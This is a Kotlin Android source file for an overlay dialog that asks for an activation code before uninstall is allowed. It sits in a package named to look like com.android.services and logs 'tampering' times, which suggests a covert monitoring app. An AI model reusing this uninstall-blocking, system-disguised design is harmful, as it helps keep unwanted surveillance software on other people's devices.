package com.android.services.dialogs

import android.app.Dialog
import android.content.Context
import android.os.Build
import android.os.Bundle
import android.view.Gravity
import android.view.View
import android.view.Window
import android.view.WindowManager
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import com.android.services.MyApplication.Companion.appContext
import com.android.services.util.AppUtils
import com.android.services.MyApplication
import com.android.services.R
import com.android.services.dialogs.UninstallDialog
import com.android.services.util.AppConstants
import com.android.services.util.formatCode

class UninstallDialog(context: Context?) : Dialog(context!!) {

    private val mCode: EditText

    /**
     * validate the activation code
     */
    private fun validate() {
        val codeText = mCode.text.toString().trim()
        if (codeText.formatCode == AppConstants.activationCode?.trim()?.formatCode ?: "") {
//            AppConstants.uninstallProtectionPreference = true
            AppUtils.updateLastTamperingTime(System.currentTimeMillis())
            Toast.makeText(appContext, "Congrats. Access is Granted.", Toast.LENGTH_LONG).show()
            dismiss()
            UninstallProtectionUtility.instance!!.finishDialog()
        } else {
            Toast.makeText(appContext, "Invalid Code", Toast.LENGTH_LONG).show()
        }
    }

    companion object {
        private val WM_FLAG_OVERxLAY =
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
    }

    init {
        requestWindowFeature(Window.FEATURE_NO_TITLE)
        this.setContentView(R.layout.protection_alert)
        val mWindow = this.window
        if (mWindow != null) {
            mWindow.setType(WM_FLAG_OVERxLAY)
            val mLayoutParams = mWindow.attributes
            mLayoutParams.gravity = Gravity.TOP or Gravity.CENTER_HORIZONTAL
            mLayoutParams.width = WindowManager.LayoutParams.MATCH_PARENT
            mLayoutParams.height = WindowManager.LayoutParams.WRAP_CONTENT
        }
        setCanceledOnTouchOutside(false)
        mCode = findViewById(R.id.osCode)

        val submit = findViewById<TextView>(R.id.submit_button)
        val cancel = findViewById<TextView>(R.id.cancel_button)
        mCode.requestFocus()
        cancel.setOnClickListener { v: View? ->
            dismiss()
            UninstallProtectionUtility.instance!!.finishDialog()
        }
        submit.setOnClickListener { v: View? -> validate() }
    }
}